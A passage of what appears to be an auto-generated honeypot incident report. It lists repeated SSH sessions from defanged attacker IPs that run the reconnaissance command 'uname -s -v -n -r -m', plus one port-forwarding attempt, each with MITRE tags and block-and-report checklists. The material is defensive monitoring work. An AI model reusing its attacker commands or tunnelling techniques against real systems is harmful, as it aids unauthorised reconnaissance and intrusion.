| `2026-09-27 13:06:57` | `cowrie.session.connect` |
| `2026-09-27 13:06:57` | `cowrie.client.version` |
| `2026-09-27 13:06:57` | `cowrie.client.kex` |
| `2026-09-27 13:06:58` | `cowrie.login.success` |
| `2026-09-27 13:06:59` | `cowrie.session.params` |
| `2026-09-27 13:06:59` | `cowrie.command.input` |
| `2026-09-27 13:06:59` | `cowrie.log.closed` |
| `2026-09-27 13:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675cbc22cdec

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:02` | `cowrie.session.connect` |
| `2026-09-27 13:07:02` | `cowrie.client.version` |
| `2026-09-27 13:07:02` | `cowrie.client.kex` |
| `2026-09-27 13:07:02` | `cowrie.login.success` |
| `2026-09-27 13:07:03` | `cowrie.session.params` |
| `2026-09-27 13:07:03` | `cowrie.command.input` |
| `2026-09-27 13:07:03` | `cowrie.log.closed` |
| `2026-09-27 13:07:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e580d98aff

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:07` | `cowrie.session.connect` |
| `2026-09-27 13:07:07` | `cowrie.client.version` |
| `2026-09-27 13:07:07` | `cowrie.client.kex` |
| `2026-09-27 13:07:08` | `cowrie.login.success` |
| `2026-09-27 13:07:09` | `cowrie.session.params` |
| `2026-09-27 13:07:09` | `cowrie.command.input` |
| `2026-09-27 13:07:09` | `cowrie.log.closed` |
| `2026-09-27 13:07:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b4df3cf484

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:12` | `cowrie.session.connect` |
| `2026-09-27 13:07:12` | `cowrie.client.version` |
| `2026-09-27 13:07:12` | `cowrie.client.kex` |
| `2026-09-27 13:07:12` | `cowrie.login.success` |
| `2026-09-27 13:07:13` | `cowrie.session.params` |
| `2026-09-27 13:07:13` | `cowrie.command.input` |
| `2026-09-27 13:07:13` | `cowrie.log.closed` |
| `2026-09-27 13:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1300849f763a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:17` | `cowrie.session.connect` |
| `2026-09-27 13:07:17` | `cowrie.client.version` |
| `2026-09-27 13:07:17` | `cowrie.client.kex` |
| `2026-09-27 13:07:18` | `cowrie.login.success` |
| `2026-09-27 13:07:18` | `cowrie.session.params` |
| `2026-09-27 13:07:18` | `cowrie.command.input` |
| `2026-09-27 13:07:19` | `cowrie.log.closed` |
| `2026-09-27 13:07:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9479fc9a0ee

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:22` | `cowrie.session.connect` |
| `2026-09-27 13:07:22` | `cowrie.client.version` |
| `2026-09-27 13:07:22` | `cowrie.client.kex` |
| `2026-09-27 13:07:23` | `cowrie.login.success` |
| `2026-09-27 13:07:23` | `cowrie.session.params` |
| `2026-09-27 13:07:23` | `cowrie.command.input` |
| `2026-09-27 13:07:24` | `cowrie.log.closed` |
| `2026-09-27 13:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2be6fbeb3c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:27` | `cowrie.session.connect` |
| `2026-09-27 13:07:27` | `cowrie.client.version` |
| `2026-09-27 13:07:27` | `cowrie.client.kex` |
| `2026-09-27 13:07:28` | `cowrie.login.success` |
| `2026-09-27 13:07:29` | `cowrie.session.params` |
| `2026-09-27 13:07:29` | `cowrie.command.input` |
| `2026-09-27 13:07:29` | `cowrie.log.closed` |
| `2026-09-27 13:07:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eee775fb4577

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:32` | `cowrie.session.connect` |
| `2026-09-27 13:07:32` | `cowrie.client.version` |
| `2026-09-27 13:07:32` | `cowrie.client.kex` |
| `2026-09-27 13:07:33` | `cowrie.login.success` |
| `2026-09-27 13:07:34` | `cowrie.session.params` |
| `2026-09-27 13:07:34` | `cowrie.command.input` |
| `2026-09-27 13:07:34` | `cowrie.log.closed` |
| `2026-09-27 13:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc1b4efe3a06

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:37` | `cowrie.session.connect` |
| `2026-09-27 13:07:37` | `cowrie.client.version` |
| `2026-09-27 13:07:37` | `cowrie.client.kex` |
| `2026-09-27 13:07:38` | `cowrie.login.success` |
| `2026-09-27 13:07:39` | `cowrie.session.params` |
| `2026-09-27 13:07:39` | `cowrie.command.input` |
| `2026-09-27 13:07:39` | `cowrie.log.closed` |
| `2026-09-27 13:07:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce12ecf0a694

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:42` | `cowrie.session.connect` |
| `2026-09-27 13:07:42` | `cowrie.client.version` |
| `2026-09-27 13:07:42` | `cowrie.client.kex` |
| `2026-09-27 13:07:42` | `cowrie.login.success` |
| `2026-09-27 13:07:43` | `cowrie.session.params` |
| `2026-09-27 13:07:43` | `cowrie.command.input` |
| `2026-09-27 13:07:43` | `cowrie.log.closed` |
| `2026-09-27 13:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d01b55f2217

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:47` | `cowrie.session.connect` |
| `2026-09-27 13:07:47` | `cowrie.client.version` |
| `2026-09-27 13:07:47` | `cowrie.client.kex` |
| `2026-09-27 13:07:47` | `cowrie.login.success` |
| `2026-09-27 13:07:48` | `cowrie.session.params` |
| `2026-09-27 13:07:48` | `cowrie.command.input` |
| `2026-09-27 13:07:48` | `cowrie.log.closed` |
| `2026-09-27 13:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978a18f50949

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:52` | `cowrie.session.connect` |
| `2026-09-27 13:07:52` | `cowrie.client.version` |
| `2026-09-27 13:07:52` | `cowrie.client.kex` |
| `2026-09-27 13:07:52` | `cowrie.login.success` |
| `2026-09-27 13:07:53` | `cowrie.session.params` |
| `2026-09-27 13:07:53` | `cowrie.command.input` |
| `2026-09-27 13:07:53` | `cowrie.log.closed` |
| `2026-09-27 13:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb3f40c47cc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:07 |
| **Last Seen** | 2026-09-27 13:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:07:57` | `cowrie.session.connect` |
| `2026-09-27 13:07:57` | `cowrie.client.version` |
| `2026-09-27 13:07:57` | `cowrie.client.kex` |
| `2026-09-27 13:07:58` | `cowrie.login.success` |
| `2026-09-27 13:07:58` | `cowrie.session.params` |
| `2026-09-27 13:07:58` | `cowrie.command.input` |
| `2026-09-27 13:07:58` | `cowrie.log.closed` |
| `2026-09-27 13:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabe9439ca7c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:02` | `cowrie.session.connect` |
| `2026-09-27 13:08:02` | `cowrie.client.version` |
| `2026-09-27 13:08:02` | `cowrie.client.kex` |
| `2026-09-27 13:08:03` | `cowrie.login.success` |
| `2026-09-27 13:08:04` | `cowrie.session.params` |
| `2026-09-27 13:08:04` | `cowrie.command.input` |
| `2026-09-27 13:08:04` | `cowrie.log.closed` |
| `2026-09-27 13:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8e79b1dc94e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:07` | `cowrie.session.connect` |
| `2026-09-27 13:08:07` | `cowrie.client.version` |
| `2026-09-27 13:08:07` | `cowrie.client.kex` |
| `2026-09-27 13:08:08` | `cowrie.login.success` |
| `2026-09-27 13:08:09` | `cowrie.session.params` |
| `2026-09-27 13:08:09` | `cowrie.command.input` |
| `2026-09-27 13:08:09` | `cowrie.log.closed` |
| `2026-09-27 13:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a2ee3ee1657

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:12` | `cowrie.session.connect` |
| `2026-09-27 13:08:12` | `cowrie.client.version` |
| `2026-09-27 13:08:12` | `cowrie.client.kex` |
| `2026-09-27 13:08:13` | `cowrie.login.success` |
| `2026-09-27 13:08:14` | `cowrie.session.params` |
| `2026-09-27 13:08:14` | `cowrie.command.input` |
| `2026-09-27 13:08:14` | `cowrie.log.closed` |
| `2026-09-27 13:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c229ebc0b3f7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:17` | `cowrie.session.connect` |
| `2026-09-27 13:08:17` | `cowrie.client.version` |
| `2026-09-27 13:08:17` | `cowrie.client.kex` |
| `2026-09-27 13:08:18` | `cowrie.login.success` |
| `2026-09-27 13:08:19` | `cowrie.session.params` |
| `2026-09-27 13:08:19` | `cowrie.command.input` |
| `2026-09-27 13:08:19` | `cowrie.log.closed` |
| `2026-09-27 13:08:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b6a4a1206e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:22` | `cowrie.session.connect` |
| `2026-09-27 13:08:22` | `cowrie.client.version` |
| `2026-09-27 13:08:22` | `cowrie.client.kex` |
| `2026-09-27 13:08:22` | `cowrie.login.success` |
| `2026-09-27 13:08:23` | `cowrie.session.params` |
| `2026-09-27 13:08:23` | `cowrie.command.input` |
| `2026-09-27 13:08:24` | `cowrie.log.closed` |
| `2026-09-27 13:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55f4ca8a21db

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:28` | `cowrie.session.connect` |
| `2026-09-27 13:08:28` | `cowrie.client.version` |
| `2026-09-27 13:08:28` | `cowrie.client.kex` |
| `2026-09-27 13:08:28` | `cowrie.login.success` |
| `2026-09-27 13:08:29` | `cowrie.session.params` |
| `2026-09-27 13:08:29` | `cowrie.command.input` |
| `2026-09-27 13:08:29` | `cowrie.log.closed` |
| `2026-09-27 13:08:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3e3402ec93d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:31` | `cowrie.session.connect` |
| `2026-09-27 13:08:31` | `cowrie.client.version` |
| `2026-09-27 13:08:32` | `cowrie.client.kex` |
| `2026-09-27 13:08:32` | `cowrie.login.success` |
| `2026-09-27 13:08:33` | `cowrie.session.params` |
| `2026-09-27 13:08:33` | `cowrie.command.input` |
| `2026-09-27 13:08:33` | `cowrie.log.closed` |
| `2026-09-27 13:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f7b88329162

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:37` | `cowrie.session.connect` |
| `2026-09-27 13:08:37` | `cowrie.client.version` |
| `2026-09-27 13:08:37` | `cowrie.client.kex` |
| `2026-09-27 13:08:38` | `cowrie.login.success` |
| `2026-09-27 13:08:38` | `cowrie.session.params` |
| `2026-09-27 13:08:38` | `cowrie.command.input` |
| `2026-09-27 13:08:39` | `cowrie.log.closed` |
| `2026-09-27 13:08:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6392ba4a3b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:42` | `cowrie.session.connect` |
| `2026-09-27 13:08:42` | `cowrie.client.version` |
| `2026-09-27 13:08:42` | `cowrie.client.kex` |
| `2026-09-27 13:08:43` | `cowrie.login.success` |
| `2026-09-27 13:08:44` | `cowrie.session.params` |
| `2026-09-27 13:08:44` | `cowrie.command.input` |
| `2026-09-27 13:08:44` | `cowrie.log.closed` |
| `2026-09-27 13:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d4aabc1885

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:47` | `cowrie.session.connect` |
| `2026-09-27 13:08:47` | `cowrie.client.version` |
| `2026-09-27 13:08:47` | `cowrie.client.kex` |
| `2026-09-27 13:08:47` | `cowrie.login.success` |
| `2026-09-27 13:08:48` | `cowrie.session.params` |
| `2026-09-27 13:08:48` | `cowrie.command.input` |
| `2026-09-27 13:08:48` | `cowrie.log.closed` |
| `2026-09-27 13:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b591e245d04

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:52` | `cowrie.session.connect` |
| `2026-09-27 13:08:52` | `cowrie.client.version` |
| `2026-09-27 13:08:52` | `cowrie.client.kex` |
| `2026-09-27 13:08:53` | `cowrie.login.success` |
| `2026-09-27 13:08:53` | `cowrie.session.params` |
| `2026-09-27 13:08:53` | `cowrie.command.input` |
| `2026-09-27 13:08:53` | `cowrie.log.closed` |
| `2026-09-27 13:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f496b0cdb12

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:54` | `cowrie.session.connect` |
| `2026-09-27 13:08:54` | `cowrie.client.version` |
| `2026-09-27 13:08:54` | `cowrie.client.kex` |
| `2026-09-27 13:08:54` | `cowrie.login.success` |
| `2026-09-27 13:08:55` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:08:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:08:55` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-27 13:08:56` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66260d5b5471

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:08 |
| **Last Seen** | 2026-09-27 13:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:08:57` | `cowrie.session.connect` |
| `2026-09-27 13:08:57` | `cowrie.client.version` |
| `2026-09-27 13:08:57` | `cowrie.client.kex` |
